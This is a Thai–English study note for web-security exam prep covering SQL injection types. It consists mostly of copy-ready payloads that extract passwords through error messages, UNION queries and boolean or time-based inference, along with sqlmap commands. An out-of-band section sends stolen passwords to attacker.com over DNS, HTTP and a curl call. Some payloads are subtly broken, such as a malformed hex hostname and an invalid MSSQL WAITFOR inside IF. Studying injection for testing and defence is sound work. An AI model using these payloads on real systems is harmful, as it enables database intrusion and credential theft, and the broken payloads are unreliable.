# Types of SQL Injection — ประเภทของ SQL Injection

> **Overview:** เข้าใจประเภทต่างๆ ของ SQL Injection และเลือกใช้ให้เหมาะสม

---

## Table of Contents
1. [Overview](#overview)
2. [In-Band SQLi](#1-in-band-sqli-classic-sqli)
   - [Error-based](#11-error-based-sqli)
   - [UNION-based](#12-union-based-sqli)
3. [Blind SQLi](#2-blind-sqli-inferential-sqli)
   - [Boolean-based](#21-boolean-based-blind-sqli)
   - [Time-based](#22-time-based-blind-sqli)
4. [Out-of-Band SQLi](#3-out-of-band-sqli)
5. [Comparison & Decision Tree](#comparison-table)
6. [SQLmap Mapping](#sqlmap-technique-mapping)

---

## Overview

```
SQL Injection
│
├── 1. In-Band SQLi (Classic)
│   ├── Error-based
│   └── UNION-based
│
├── 2. Blind SQLi (Inferential)
│   ├── Boolean-based
│   └── Time-based
│
└── 3. Out-of-Band SQLi
```

---

## การแบ่งประเภทตาม "วิธีได้ข้อมูล"

| Type | เห็น Output ไหม? | ได้ข้อมูลยังไง |
|------|-----------------|---------------|
| **In-Band** | ✅ เห็นโดยตรง | Error message หรือ UNION |
| **Blind** | ❌ ไม่เห็น | สังเกต behavior (true/false, time) |
| **Out-of-Band** | ❌ ไม่เห็น | ส่งข้อมูลออกไปช่องทางอื่น (DNS, HTTP) |

---

## 1. In-Band SQLi (Classic SQLi)

**ลักษณะ:** ใช้ **ช่องทางเดียวกัน** ในการ inject และรับ output

```
┌──────────┐     Request + Payload    ┌──────────┐
│ Attacker │ ───────────────────────► │  Server  │
│          │ ◄─────────────────────── │          │
└──────────┘     Response + Data      └──────────┘
                 (เห็นข้อมูลใน response)
```

---

### 1.1 Error-based SQLi

**หลักการ:** ทำให้ database error และ **แสดง data ใน error message**

**เมื่อไหร่ใช้ได้:**
- เว็บแสดง database error messages
- Verbose error enabled

#### MySQL Error-based Payloads

```sql
-- ExtractValue (XML)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--

-- Error ที่ได้:
-- XPATH syntax error: '~s3cr3tpassword'
--                       ↑ data ที่ต้องการ!

-- UpdateXML
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)--

-- Error:
-- XPATH syntax error: '~root@localhost'

-- Double Query (subquery error)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

#### PostgreSQL Error-based Payloads

```sql
-- CAST error
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--

-- Error:
-- invalid input syntax for integer: "s3cr3tpassword"
--                                    ↑ data!
```

#### MSSQL Error-based Payloads

```sql
-- CONVERT error
' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users))--

-- Error:
-- Conversion failed when converting the varchar value 's3cr3tpassword' to data type int
```

#### Oracle Error-based Payloads

```sql
-- UTL_INADDR
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1))--

-- XMLType
' AND (SELECT XMLType('<:'||(SELECT password FROM users WHERE ROWNUM=1)||'>') FROM dual) IS NOT NULL--
```

**ข้อดี:**
- ได้ data ทันทีใน error
- เร็วกว่า Blind SQLi

**ข้อเสีย:**
- ต้อง error แสดงบนหน้าเว็บ
- Modern apps มักซ่อน errors

---

### 1.2 UNION-based SQLi

**หลักการ:** ใช้ `UNION` รวม query เพื่อ **แสดง data บนหน้าเว็บ**

**เมื่อไหร่ใช้ได้:**
- มี output แสดงบนหน้าเว็บ
- รู้จำนวน columns

#### ตัวอย่าง

```sql
-- Original query
SELECT name, price FROM products WHERE category = 'Gifts'

-- UNION attack
' UNION SELECT username, password FROM users--

-- ผลลัพธ์แสดงบนหน้าเว็บ:
-- Gift Card    | $50
-- Gift Box     | $25
-- admin        | s3cr3tpassword  ← data จาก users table!
-- carlos       | montoya123
```

#### Attack Flow

```
1. หาจำนวน columns (ORDER BY / UNION SELECT NULL)
   ' ORDER BY 1--  ✓
   ' ORDER BY 2--  ✓
   ' ORDER BY 3--  ✗  → 2 columns

2. หา column ที่แสดงผล
   ' UNION SELECT 'a','b'--

3. Extract data
   ' UNION SELECT username, password FROM users--
```

**ข้อดี:**
- ได้ data หลาย rows ทีเดียว
- เร็วที่สุดใน SQLi types

**ข้อเสีย:**
- ต้องมี output บนหน้าเว็บ
- ต้องรู้จำนวน columns

**ดูรายละเอียดเพิ่ม:** [03-UNION-Attack.md](./03-UNION-Attack.md)

---

## 2. Blind SQLi (Inferential SQLi)

**ลักษณะ:** **ไม่เห็น output โดยตรง** แต่สังเกตจาก behavior

```
┌──────────┐     Request + Payload    ┌──────────┐
│ Attacker │ ───────────────────────► │  Server  │
│          │ ◄─────────────────────── │          │
└──────────┘     Response             └──────────┘
                 (ไม่มี data แต่ behavior ต่าง)

Attacker ต้อง infer (อนุมาน) จาก:
- True/False → content ต่างกัน
- Time → response time ต่างกัน
```

---

### 2.1 Boolean-based Blind SQLi

**หลักการ:** ถาม **Yes/No question** แล้วดู response ต่างกันไหม

**เมื่อไหร่ใช้ได้:**
- Response ต่างกันเมื่อ condition true vs false
- เช่น: แสดง content vs ไม่แสดง, redirect vs ไม่ redirect

#### ตัวอย่าง

```sql
-- ถามว่า: ตัวแรกของ password คือ 's' ไหม?

-- True condition (ถ้าใช่)
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s'--
-- Response: แสดง content ปกติ ✓

-- False condition (ถ้าไม่ใช่)
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
-- Response: ไม่มี content หรือ error ✗
```

#### Process การ extract ทีละตัว

```
Password = ???

ตัวที่ 1:
  's' → True  ✓  → Password = s???

ตัวที่ 2:
  'a' → False
  'b' → False
  'c' → False
  '3' → True  ✓  → Password = s3???

ตัวที่ 3:
  'c' → True  ✓  → Password = s3c???

... ทำไปเรื่อยๆ ...

Password = s3cr3t
```

#### Payload Variants

```sql
-- ตรวจ character ตรงๆ
' AND SUBSTRING(password,1,1)='a'--

-- ใช้ ASCII value
' AND ASCII(SUBSTRING(password,1,1))=97--  -- 97 = 'a'

-- Binary search (เร็วกว่า)
' AND ASCII(SUBSTRING(password,1,1))>96--  -- มากกว่า 96?
' AND ASCII(SUBSTRING(password,1,1))<100-- -- น้อยกว่า 100?

-- MySQL
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='s'--

-- PostgreSQL
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='s'--

-- MSSQL
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s'--
```

#### Binary Search Optimization

แทนที่จะ guess ทีละตัว (26 ตัวอักษร + ตัวเลข) ใช้ binary search:

```sql
-- หา ASCII value ของตัวอักษร
' AND ASCII(SUBSTRING(password,1,1))>64--   -- > 64? (มากกว่า '@')
-- True → ตัวอักษรอยู่ระหว่าง 65-127

' AND ASCII(SUBSTRING(password,1,1))>96--   -- > 96? (มากกว่า '`')
-- True → ตัวอักษรอยู่ระหว่าง 97-127 (lowercase หรือมากกว่า)

' AND ASCII(SUBSTRING(password,1,1))>112--  -- > 112? (มากกว่า 'p')
-- True → ตัวอักษรอยู่ระหว่าง 113-127

' AND ASCII(SUBSTRING(password,1,1))>120--  -- > 120? (มากกว่า 'x')
-- False → ตัวอักษรอยู่ระหว่าง 113-120

... ทำต่อจนหาเจอ ...
```

**ข้อดี:**
- ใช้ได้แม้ไม่เห็น output
- Error ไม่ต้องแสดง

**ข้อเสีย:**
- ช้ามาก (ต้อง guess ทีละตัว)
- ต้องส่ง request จำนวนมาก

---

### 2.2 Time-based Blind SQLi

**หลักการ:** ทำให้ database **หน่วงเวลา** ถ้า condition เป็น true

**เมื่อไหร่ใช้ได้:**
- ไม่เห็น output เลย
- Response เหมือนกันทั้ง true และ false
- แต่สังเกต response **time** ได้

#### Database-Specific Payloads

```sql
-- MySQL
' AND IF(SUBSTRING(password,1,1)='s', SLEEP(5), 0)--
-- ถ้าตัวแรก = 's' → รอ 5 วินาที
-- ถ้าไม่ใช่ → response ทันที

-- Alternative MySQL
' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='s')--

-- PostgreSQL
' AND CASE WHEN SUBSTRING(password,1,1)='s' THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Alternative PostgreSQL
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='s') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin'--

-- MSSQL
'; IF SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s' WAITFOR DELAY '0:0:5'--

-- Alternative MSSQL
' AND IF(SUBSTRING(password,1,1)='s', WAITFOR DELAY '0:0:5', 0)--

-- Oracle
' AND CASE WHEN SUBSTR(password,1,1)='s' THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END=0--

-- Alternative Oracle
' AND (SELECT CASE WHEN SUBSTR(password,1,1)='s' THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM users WHERE username='admin')=0--

-- SQLite
' AND CASE WHEN SUBSTR(password,1,1)='s' THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 0 END--
```

#### Process

```
Testing character 1 of password:

Request: ...IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)
Response time: 0.2s  → 'a' is NOT correct

Request: ...IF(SUBSTRING(password,1,1)='b', SLEEP(5), 0)
Response time: 0.2s  → 'b' is NOT correct

...

Request: ...IF(SUBSTRING(password,1,1)='s', SLEEP(5), 0)
Response time: 5.2s  → 's' IS correct! ✓

Password[1] = 's'
```

#### Conditional Time-based

```sql
-- หา length ของ password ก่อน
' AND IF(LENGTH(password)>5, SLEEP(3), 0)--  -- > 5?
' AND IF(LENGTH(password)>10, SLEEP(3), 0)-- -- > 10?
' AND IF(LENGTH(password)=8, SLEEP(3), 0)--  -- = 8?

-- แล้วค่อย extract ทีละตัว
' AND IF(SUBSTRING(password,1,1)='s', SLEEP(3), 0)--
' AND IF(SUBSTRING(password,2,1)='3', SLEEP(3), 0)--
```

**ข้อดี:**
- ใช้ได้แม้ไม่มี output ใดๆ เลย
- Response content เหมือนกันก็ยังใช้ได้

**ข้อเสีย:**
- ช้ามากๆ (ต้องรอ delay ทุก request)
- Network latency อาจทำให้ผิดพลาด

---

## 3. Out-of-Band SQLi

**ลักษณะ:** ส่ง data ออกไป **ช่องทางอื่น** (DNS, HTTP)

```
┌──────────┐     Request + Payload    ┌──────────┐
│ Attacker │ ───────────────────────► │  Server  │
│          │                          │          │
│          │                          │    │     │
└──────────┘                          └────│─────┘
      ▲                                    │
      │         DNS/HTTP Request           │
      │      (with extracted data)         │
      └────────────────────────────────────┘
                                    ↓
                           ┌──────────────┐
                           │ Attacker's   │
                           │ DNS/HTTP     │
                           │ Server       │
                           └──────────────┘
```

**เมื่อไหร่ใช้ได้:**
- Database สามารถทำ DNS/HTTP request ได้
- In-band และ Blind ใช้ไม่ได้ (async, no response)

#### MySQL Out-of-Band

```sql
-- DNS exfiltration via LOAD_FILE (Windows)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))--
-- Database จะ DNS lookup: s3cr3tpassword.attacker.com

-- DNS exfiltration via LOAD_FILE (requires FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c, (SELECT password FROM users LIMIT 1), 0x2e6174746163c6b65722e636f6d5c5c61))--
```

#### MSSQL Out-of-Band

```sql
-- xp_dirtree (DNS)
'; EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\a'--

-- xp_fileexist (DNS)
'; EXEC master..xp_fileexist '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\a'--

-- xp_subdirs (DNS)
'; EXEC master..xp_subdirs '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\a'--
```

#### Oracle Out-of-Band

```sql
-- UTL_HTTP (HTTP request)
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual--

-- UTL_INADDR (DNS)
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM dual--

-- HTTPURITYPE (HTTP)
' UNION SELECT HTTPURITYPE('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)).GETCLOB() FROM dual--
```

#### PostgreSQL Out-of-Band

```sql
-- COPY to program
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?data='||(SELECT password FROM users)--

-- dblink (requires extension)
'; SELECT dblink_send_query('host=attacker.com dbname=x', 'SELECT '||(SELECT password FROM users))--
```

**ข้อดี:**
- ได้ data ทันทีไม่ต้อง guess
- ใช้ได้กับ async applications

**ข้อเสีย:**
- ต้องมี server รับ data (Burp Collaborator, interactsh)
- Database ต้อง support outbound connections
- Firewall อาจ block

---

## Comparison Table

| Type | เห็น Output | ความเร็ว | ความยาก | เมื่อไหร่ใช้ |
|------|------------|---------|--------|------------|
| **Error-based** | ✅ ใน error | เร็วมาก | ง่าย | Error แสดง |
| **UNION-based** | ✅ บนหน้าเว็บ | เร็วมาก | ง่าย | มี output |
| **Boolean Blind** | ❌ | ช้า | ปานกลาง | Response ต่างกัน |
| **Time Blind** | ❌ | ช้ามาก | ปานกลาง | ไม่มี output เลย |
| **Out-of-Band** | ❌ | เร็ว | ยาก | DB ติดต่อ network ได้ |

---

## Decision Tree: เลือก Type ไหน?

```
                    เห็น data บนหน้าเว็บไหม?
                           │
              ┌────────────┴────────────┐
              ▼                         ▼
            Yes                        No
              │                         │
              ▼                         ▼
         UNION-based           เห็น error message ไหม?
                                       │
                          ┌────────────┴────────────┐
                          ▼                         ▼
                        Yes                        No
                          │                         │
                          ▼                         ▼
                    Error-based          Response ต่างกันไหม?
                                                   │
                                      ┌────────────┴────────────┐
                                      ▼                         ▼
                                    Yes                        No
                                      │                         │
                                      ▼                         ▼
                                Boolean Blind             Time-based
                                                     (หรือ Out-of-Band)
```

---

## SQLmap Technique Mapping

| Type | SQLmap Flag | Description |
|------|-------------|-------------|
| Boolean Blind | `B` | Boolean-based blind |
| Error-based | `E` | Error-based |
| UNION-based | `U` | UNION query-based |
| Stacked queries | `S` | Stacked queries |
| Time-based | `T` | Time-based blind |
| Inline queries | `Q` | Inline queries |

```bash
# ใช้เฉพาะ UNION + Error (In-Band)
sqlmap -u "URL" --technique=UE

# ใช้ Blind techniques
sqlmap -u "URL" --technique=BT

# ใช้ทุก techniques
sqlmap -u "URL" --technique=BEUSTQ
```

---

## BSCP Exam Tips

| Situation | Type ที่น่าจะเจอ |
|-----------|----------------|
| Product filter แสดง products | UNION-based |
| Login form | Boolean Blind / Error-based |
| Cookie tracking | Boolean Blind / Time-based |
| Search ไม่แสดงผลบนเว็บ | Blind SQLi |
| ไม่รู้จะเป็นอะไร | ใช้ SQLmap `--level 5 --risk 3` |

### Quick Test Order

```
1. ลอง UNION attack ก่อน (เร็วสุด)
2. ดู error message (Error-based)
3. ลอง Boolean condition (Blind)
4. ลอง Time delay (Time-based)
5. ใช้ SQLmap
```

---

## Summary

```
┌─────────────────────────────────────────────────────────────┐
│  เห็น data โดยตรง     →  In-Band (UNION, Error)            │
│  ไม่เห็น แต่ต่างกัน   →  Boolean Blind                     │
│  ไม่เห็น เหมือนกัน   →  Time-based Blind                   │
│  ต้องส่งออกไป        →  Out-of-Band                       │
└─────────────────────────────────────────────────────────────┘
```

---

## Related Files

- [02-SQL-Injection-Detection.md](./02-SQL-Injection-Detection.md) — Detection & Basic Exploitation
- [03-UNION-Attack.md](./03-UNION-Attack.md) — UNION-based (In-Band)
- [04-Blind-SQLi.md](./04-Blind-SQLi.md) — Blind SQLi techniques
- [05-SQLmap-Usage.md](./05-SQLmap-Usage.md) — Automated testing
